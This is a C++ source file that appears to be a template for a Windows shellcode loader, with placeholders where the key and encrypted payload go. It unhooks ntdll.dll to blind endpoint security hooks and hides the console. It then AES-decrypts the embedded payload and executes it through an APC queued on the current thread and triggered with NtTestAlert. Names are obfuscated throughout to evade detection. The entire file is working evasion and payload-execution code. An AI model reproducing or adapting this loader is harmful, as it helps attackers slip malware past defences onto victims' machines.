#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment(lib, "ntdll")

using Random6 = NTSTATUS(NTAPI*)();

unsigned char sNTD [] = {'n','t','d','l','l','.','d','l','l'};
unsigned char sTest []= {'N','t','T','e','s','t','A','l','e','r','t'};
unsigned char sNTdD []= {'n','t','d','l','l','.','d','l','l'};
unsigned char sEtwR []= {'E','t','w','E','v','e','n','t','W','r','i','t','e'};

int Random1(char * Random3, unsigned int Random3_len, char * Random2, size_t Random2len) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) Random2, (DWORD) Random2len, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) Random3, (DWORD *) &Random3_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}

static int Unhook() {
	HANDLE pollutedNtdll;
	HANDLE hFile;
	HANDLE hFileMapping;
	LPVOID hMapping;

	//get handle of pollutted ntdll.dll

	LPCSTR Ntdll = "ntdll.dll";
	pollutedNtdll = GetModuleHandleA(Ntdll);

	LPCSTR NtdllPath = "c:\\windows\\system32\\ntdll.dll";
	
	// open fresh copy of ntdll.dll and map a view of it

	hFile = CreateFileA(NtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return -1;
	}

	hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (!hFileMapping) {
		CloseHandle(hFile);
		return -1;
	}

	hMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (!hMapping) {
		CloseHandle(hFile);
		CloseHandle(hFileMapping);
		return -1;
	}

	// find .text section of ntdll

	IMAGE_DOS_HEADER * hImgDosHeader = (IMAGE_DOS_HEADER * )hMapping;
	IMAGE_NT_HEADERS* hImgNtHeaders = (IMAGE_NT_HEADERS*)((DWORD_PTR)hMapping + hImgDosHeader->e_lfanew);
	IMAGE_FILE_HEADER hImgFileHeader = (IMAGE_FILE_HEADER)(hImgNtHeaders->FileHeader);
	IMAGE_SECTION_HEADER* hImgSecHeader = (IMAGE_SECTION_HEADER*)((size_t)hImgNtHeaders + sizeof(*hImgNtHeaders));
	DWORD oldprotect = 0;

	for (int i = 0; i < hImgFileHeader.NumberOfSections; i++) {
		if (!strcmp((char*)hImgSecHeader[i].Name, ".text")) {
			VirtualProtect((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				hImgSecHeader->Misc.VirtualSize,
				PAGE_EXECUTE_READWRITE,
				&oldprotect);
			if (!oldprotect) {
				return -1;
			}
			memcpy((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				(LPVOID)((DWORD_PTR)hMapping + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				hImgSecHeader->Misc.VirtualSize);
			VirtualProtect((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				hImgSecHeader->Misc.VirtualSize,
				oldprotect,
				&oldprotect);
			if (!oldprotect) {
				return -1;
			}
			return 0;
		}
	}
	return -1;
}


int main()
{
	DWORD oldprotect = 0;
	char Random2[]=KEYVALUE
	unsigned char Random3[]=PAYVAL

	unsigned int Random3_len = sizeof(Random3);
        
       Unhook();
	FreeConsole();
	Random6 Random7 = (Random6)(GetProcAddress(GetModuleHandleA(sNTD), sTest));
	SIZE_T Random4 = sizeof(Random3);
	
	Random1((char *) Random3, Random3_len, Random2, sizeof(Random2));

	LPVOID Random5 = VirtualAlloc(NULL, Random4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	WriteProcessMemory(GetCurrentProcess(), Random5, Random3, Random4, NULL);

	VirtualProtect(Random5, Random3_len, PAGE_EXECUTE_READ, &oldprotect);
	

	PTHREAD_START_ROUTINE Random8 = (PTHREAD_START_ROUTINE)Random5;
	QueueUserAPC((PAPCFUNC)Random8, GetCurrentThread(), NULL);
	Random7();

	return 0;
}
